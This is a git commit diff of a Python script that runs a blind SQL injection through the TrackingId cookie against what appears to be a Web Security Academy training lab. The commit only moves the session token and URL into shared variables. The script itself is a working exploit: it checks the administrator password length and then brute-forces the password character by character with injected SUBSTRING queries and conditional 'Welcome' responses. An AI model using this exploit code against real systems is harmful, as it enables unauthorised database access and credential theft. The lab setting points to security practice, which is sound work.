56c7f55a1c92e2ae0dad5b631d56f4ab152c3548
iLightThings <gitgub@ggray.info>
2021-02-20 09:19:00 -0500

    Update blind-sql-conditional-responces.py

--- blind-sql-conditional-responces.py
+++ blind-sql-conditional-responces.py
@@ -8,28 +8,27 @@ import requests
 import string
 #Mquery = """' AND (SELECT 'PPPP' FROM users WHERE username='administrator' and Length(password)>1 )='PPPP"""
 Cquery = "CDYqbMCzSsI74o8w"
+SessionToken = 'sPU8wPuBIAAI87M8C0UlqtZ6xhADy7up'
+url = 'https://ac981f3c1e6a247780a93c0800b700f1.web-security-academy.net/'
 
+
+#Single Queary Requests. 
 def basic_q(q):
 	
 	Mquery = q
-	cookiesStuff = {'TrackingId':Cquery+Mquery,'session':'YVWLiuB4RkbPjS0hMX7JPK8EgjedhUKy'}
-	r = requests.get('https://acf81f571fa6e54780429fc900150065.web-security-academy.net/',cookies=cookiesStuff)
+	cookiesStuff = {'TrackingId':Cquery+Mquery,'session':SessionToken}
+	r = requests.get(url,cookies=cookiesStuff)
 	print(Cquery+Mquery)
 	print(r.text.find('Welcome'))
 
-#Passed = r.text.find('Welcome')
 
-
-
-
-#print(Nquery)
-
+#Password Legnth Checker
 def passwordLength():
 	for x in range (0,40):
 		
 		Mquery = f"""' AND (SELECT 'a' FROM users WHERE username='administrator' and Length(password)={x} )='a"""
-		cookiesStuff = {'TrackingId':Cquery+Mquery,'session':'sPU8wPuBIAAI87M8C0UlqtZ6xhADy7up'}
-		r = requests.get('https://acf81f571fa6e54780429fc900150065.web-security-academy.net/',cookies=cookiesStuff)
+		cookiesStuff = {'TrackingId':Cquery+Mquery,'session':SessionToken}
+		r = requests.get(url,cookies=cookiesStuff)
 		print(r.text.find('Welcome'), "Testing " , x)
 		print(r.status_code)
 		
@@ -46,8 +45,8 @@ def passwordbrute(pass_len):
 	for x in range(1,21):
 		for y in char:
 			Mquery = f"""' AND (SELECT SUBSTRING(password,1,{x}) from users WHERE username='administrator')='{Found_password}{y}' --"""
-			cookiesStuff = 		{'TrackingId':Cquery+Mquery,'session':'sPU8wPuBIAAI87M8C0UlqtZ6xhADy7up'}
-			r = requests.get('https://ac981f3c1e6a247780a93c0800b700f1.web-security-academy.net/',cookies=cookiesStuff)
+			cookiesStuff = 		{'TrackingId':Cquery+Mquery,'session':SessionToken}
+			r = requests.get(url,cookies=cookiesStuff)
 			print(str(r.text.find('Welcome')) + " --- " + str(r.status_code))
 			print(Mquery)
 			
